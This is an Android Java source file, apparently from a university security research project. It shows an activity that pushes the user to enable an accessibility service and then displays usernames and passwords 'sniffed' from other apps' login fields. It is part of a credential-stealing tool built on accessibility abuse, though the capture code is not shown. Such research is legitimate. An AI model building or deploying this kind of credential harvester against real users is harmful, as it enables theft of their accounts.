package de.fau.i1.aka.avt;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;

import java.util.HashSet;
import java.util.Locale;

import de.fau.i1.aka.avt.Services.AccessibilityServiceSM;

import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.PREFS_SNIFFED_PACKAGE_NAMES;
import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.SHARED_PREFS;

public class SeedActivity extends AppCompatActivity {
    TextView textView;

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        // getRunningServices is not available as of Oreo, which is perfectly fine for our use cases
        try {
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (NullPointerException ignored) {}
        return false;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_seed);
        textView = (TextView) findViewById(R.id.result_view);

        if (!isServiceRunning(AccessibilityServiceSM.class)) {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(i);
            finish();
        } else {
            updateTextView();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateTextView();
    }

    private void updateTextView() {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);

        textView.setText("The following packages have been sniffed:\n\n");
        for (String packageName : sharedPreferences.getStringSet(PREFS_SNIFFED_PACKAGE_NAMES, new HashSet<String>())) {
            String appendString = String.format(Locale.ENGLISH, "%s:\nuser: %s\npass: %s\n\n",
                    packageName,
                    sharedPreferences.getString(packageName+"user", null),
                    sharedPreferences.getString(packageName+"pass", null)
            );
            textView.append(appendString);
        }
    }
}
